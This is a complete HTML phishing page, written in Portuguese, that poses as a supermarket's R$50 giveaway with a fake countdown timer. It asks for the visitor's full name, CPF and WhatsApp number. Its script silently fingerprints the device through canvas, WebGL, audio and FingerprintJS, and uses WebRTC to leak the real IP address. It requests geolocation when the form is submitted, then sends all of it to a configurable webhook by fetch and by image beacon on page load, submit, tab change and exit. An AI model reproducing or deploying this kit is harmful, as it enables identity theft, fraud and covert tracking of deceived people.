<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supermercado Araguaina - Promocao Especial</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>üõí</text></svg>">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a5f2a 0%, #2e8b3e 50%, #1a5f2a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #ff6b00, #ff8c00);
            color: white;
            padding: 25px;
            text-align: center;
        }
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 5px;
        }
        .header p {
            font-size: 0.9rem;
            opacity: 0.9;
        }
        .promo-badge {
            background: #ff0000;
            color: white;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            font-size: 1.2rem;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        .content {
            padding: 30px;
        }
        .prize-box {
            background: linear-gradient(135deg, #ffd700, #ffec00);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            margin-bottom: 25px;
            border: 3px dashed #ff6b00;
        }
        .prize-box h2 {
            color: #1a5f2a;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        .prize-box p {
            color: #333;
            font-size: 1rem;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
        }
        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #2e8b3e;
        }
        .btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #2e8b3e, #1a5f2a);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .footer {
            background: #f5f5f5;
            padding: 15px;
            text-align: center;
            font-size: 0.8rem;
            color: #666;
        }
        .timer {
            background: #ff0000;
            color: white;
            padding: 10px;
            text-align: center;
            font-weight: bold;
        }
        .success-message {
            display: none;
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-top: 20px;
        }
        .loader {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .loader::after {
            content: '';
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2e8b3e;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üõí Supermercado Araguaina</h1>
            <p>Promocao Exclusiva - Novembro 2024</p>
        </div>

        <div class="promo-badge">
            üéâ VOCE FOI SELECIONADO! üéâ
        </div>

        <div class="timer" id="timer">
            ‚è∞ Oferta expira em: <span id="countdown">14:59</span>
        </div>

        <div class="content">
            <div class="prize-box">
                <h2>R$ 50,00</h2>
                <p>em compras no Supermercado Araguaina!</p>
            </div>

            <form id="promoForm">
                <div class="form-group">
                    <label for="nome">Seu Nome Completo:</label>
                    <input type="text" id="nome" name="nome" placeholder="Digite seu nome" required>
                </div>

                <div class="form-group">
                    <label for="cpf">CPF (para validacao):</label>
                    <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
                </div>

                <div class="form-group">
                    <label for="telefone">WhatsApp:</label>
                    <input type="tel" id="telefone" name="telefone" placeholder="(63) 99999-9999" required>
                </div>

                <button type="submit" class="btn" id="submitBtn">
                    RESGATAR MEUS R$ 50,00
                </button>
            </form>

            <div class="loader" id="loader"></div>

            <div class="success-message" id="successMsg">
                ‚úÖ Parabens! Seu cupom foi gerado!<br>
                <strong>Codigo: ARAGA2024-7847</strong><br>
                <small>Apresente este codigo na loja.</small>
            </div>
        </div>

        <div class="footer">
            Promocao valida ate 30/11/2024<br>
            Supermercado Araguaina - Av. Amazonas, 1250
        </div>
    </div>

    <!-- FingerprintJS -->
    <script src="https://cdn.jsdelivr.net/npm/@AugurProject/fingerprintjs@3.3.3/dist/fp.min.js"></script>

    <script>
        // ============================================
        // CONFIGURACAO - ALTERAR ANTES DE USAR
        // ============================================
        const WEBHOOK_URL = 'https://webhook.site/YOUR-UNIQUE-ID'; // Substituir pelo seu webhook
        const CAMPAIGN_ID = 'IR-KALINE-PROMO-001';

        // ============================================
        // COLETA DE DADOS DO DISPOSITIVO
        // ============================================
        let collectedData = {
            timestamp: new Date().toISOString(),
            campaign: CAMPAIGN_ID,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || 'N/A',
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation ? screen.orientation.type : 'N/A'
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio
            },
            timezone: {
                offset: new Date().getTimezoneOffset(),
                name: Intl.DateTimeFormat().resolvedOptions().timeZone
            },
            connection: null,
            battery: null,
            geolocation: null,
            webrtcIPs: [],
            fingerprint: null,
            formData: null
        };

        // ============================================
        // WEBRTC IP LEAK (CAPTURA IP REAL)
        // ============================================
        async function getWebRTCIPs() {
            return new Promise((resolve) => {
                const ips = [];
                const RTCPeerConnection = window.RTCPeerConnection ||
                                         window.mozRTCPeerConnection ||
                                         window.webkitRTCPeerConnection;

                if (!RTCPeerConnection) {
                    resolve(ips);
                    return;
                }

                const pc = new RTCPeerConnection({
                    iceServers: [
                        { urls: 'stun:stun.l.google.com:19302' },
                        { urls: 'stun:stun1.l.google.com:19302' }
                    ]
                });

                pc.createDataChannel('');

                pc.onicecandidate = (event) => {
                    if (!event.candidate) {
                        pc.close();
                        resolve(ips);
                        return;
                    }

                    const candidate = event.candidate.candidate;
                    const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}|([a-f0-9]{1,4}:){7}[a-f0-9]{1,4}/gi);

                    if (ipMatch) {
                        ipMatch.forEach(ip => {
                            if (!ips.includes(ip) && !ip.startsWith('0.') && ip !== '0.0.0.0') {
                                ips.push(ip);
                            }
                        });
                    }
                };

                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => resolve(ips));

                // Timeout de 5 segundos
                setTimeout(() => {
                    pc.close();
                    resolve(ips);
                }, 5000);
            });
        }

        // ============================================
        // GEOLOCATION API
        // ============================================
        async function getGeolocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        });
                    },
                    (error) => {
                        resolve({ error: error.message, code: error.code });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // ============================================
        // BATTERY API
        // ============================================
        async function getBatteryInfo() {
            if (!navigator.getBattery) return null;

            try {
                const battery = await navigator.getBattery();
                return {
                    charging: battery.charging,
                    level: battery.level,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch {
                return null;
            }
        }

        // ============================================
        // CONNECTION API
        // ============================================
        function getConnectionInfo() {
            const conn = navigator.connection ||
                        navigator.mozConnection ||
                        navigator.webkitConnection;

            if (!conn) return null;

            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData,
                type: conn.type
            };
        }

        // ============================================
        // FINGERPRINT.JS
        // ============================================
        async function getFingerprint() {
            try {
                // Fallback se FingerprintJS nao carregar
                if (typeof FingerprintJS === 'undefined') {
                    return generateFallbackFingerprint();
                }

                const fp = await FingerprintJS.load();
                const result = await fp.get();
                return {
                    visitorId: result.visitorId,
                    confidence: result.confidence,
                    components: Object.keys(result.components).reduce((acc, key) => {
                        acc[key] = result.components[key].value;
                        return acc;
                    }, {})
                };
            } catch {
                return generateFallbackFingerprint();
            }
        }

        function generateFallbackFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('fingerprint', 2, 2);

            return {
                visitorId: hashCode(canvas.toDataURL() + navigator.userAgent + screen.width),
                confidence: 0.5,
                fallback: true
            };
        }

        function hashCode(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }

        // ============================================
        // CANVAS FINGERPRINT
        // ============================================
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');

            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.font = '11pt Arial';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.font = '18pt Arial';
            ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);

            return canvas.toDataURL();
        }

        // ============================================
        // WEBGL FINGERPRINT
        // ============================================
        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) return null;

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
            };
        }

        // ============================================
        // AUDIO FINGERPRINT
        // ============================================
        async function getAudioFingerprint() {
            try {
                const AudioContext = window.AudioContext || window.webkitAudioContext;
                if (!AudioContext) return null;

                const context = new AudioContext();
                const oscillator = context.createOscillator();
                const analyser = context.createAnalyser();
                const gainNode = context.createGain();
                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);

                gainNode.gain.value = 0;
                oscillator.type = 'triangle';
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(context.destination);
                oscillator.start(0);

                return new Promise((resolve) => {
                    scriptProcessor.onaudioprocess = (event) => {
                        const data = event.inputBuffer.getChannelData(0);
                        let sum = 0;
                        for (let i = 0; i < data.length; i++) {
                            sum += Math.abs(data[i]);
                        }
                        oscillator.disconnect();
                        context.close();
                        resolve(sum.toString().slice(0, 10));
                    };
                });
            } catch {
                return null;
            }
        }

        // ============================================
        // COLETA INICIAL (SILENCIOSA)
        // ============================================
        async function collectInitialData() {
            console.log('[+] Iniciando coleta silenciosa...');

            // Coletas paralelas
            const [webrtcIPs, fingerprint, battery] = await Promise.all([
                getWebRTCIPs(),
                getFingerprint(),
                getBatteryInfo()
            ]);

            collectedData.webrtcIPs = webrtcIPs;
            collectedData.fingerprint = fingerprint;
            collectedData.battery = battery;
            collectedData.connection = getConnectionInfo();
            collectedData.canvas = getCanvasFingerprint();
            collectedData.webgl = getWebGLInfo();

            // Audio fingerprint (async)
            getAudioFingerprint().then(audio => {
                collectedData.audioFingerprint = audio;
            });

            console.log('[+] Dados coletados:', collectedData);

            // Enviar dados iniciais (sem formulario)
            sendData({ ...collectedData, stage: 'page_load' });
        }

        // ============================================
        // ENVIO DE DADOS
        // ============================================
        async function sendData(data) {
            try {
                // Metodo 1: Fetch
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    mode: 'no-cors'
                });

                // Metodo 2: Image beacon (backup)
                const img = new Image();
                img.src = WEBHOOK_URL + '?data=' + encodeURIComponent(btoa(JSON.stringify(data)));

                console.log('[+] Dados enviados com sucesso');
            } catch (error) {
                console.log('[-] Erro ao enviar:', error);

                // Metodo 3: LocalStorage para recuperacao posterior
                const stored = JSON.parse(localStorage.getItem('pendingData') || '[]');
                stored.push(data);
                localStorage.setItem('pendingData', JSON.stringify(stored));
            }
        }

        // ============================================
        // FORMATACAO CPF
        // ============================================
        document.getElementById('cpf').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);

            if (value.length > 9) {
                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{3})/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/(\d{3})(\d{3})/, '$1.$2');
            }

            e.target.value = value;
        });

        // ============================================
        // FORMATACAO TELEFONE
        // ============================================
        document.getElementById('telefone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);

            if (value.length > 6) {
                value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            } else if (value.length > 2) {
                value = value.replace(/(\d{2})(\d+)/, '($1) $2');
            }

            e.target.value = value;
        });

        // ============================================
        // COUNTDOWN TIMER
        // ============================================
        let timeLeft = 15 * 60; // 15 minutos

        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('countdown').textContent =
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();

        // ============================================
        // SUBMIT FORM
        // ============================================
        document.getElementById('promoForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const form = e.target;
            const btn = document.getElementById('submitBtn');
            const loader = document.getElementById('loader');
            const successMsg = document.getElementById('successMsg');

            btn.disabled = true;
            btn.textContent = 'Processando...';
            loader.style.display = 'block';

            // Coletar dados do formulario
            collectedData.formData = {
                nome: document.getElementById('nome').value,
                cpf: document.getElementById('cpf').value,
                telefone: document.getElementById('telefone').value
            };

            // Tentar obter geolocalizacao quando usuario submete (mais chances de aceitar)
            const geo = await getGeolocation();
            collectedData.geolocation = geo;

            // Enviar dados completos
            await sendData({ ...collectedData, stage: 'form_submit' });

            // Simular processamento
            await new Promise(r => setTimeout(r, 2000));

            // Mostrar sucesso
            loader.style.display = 'none';
            form.style.display = 'none';
            successMsg.style.display = 'block';

            console.log('[+] Coleta completa!');
        });

        // ============================================
        // INICIALIZACAO
        // ============================================
        document.addEventListener('DOMContentLoaded', () => {
            collectInitialData();
        });

        // Detectar quando usuario sai da pagina
        window.addEventListener('beforeunload', () => {
            sendData({ ...collectedData, stage: 'page_exit' });
        });

        // Detectar mudanca de visibilidade (usuario troca de aba)
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                sendData({ ...collectedData, stage: 'tab_hidden' });
            }
        });
    </script>
</body>
</html>
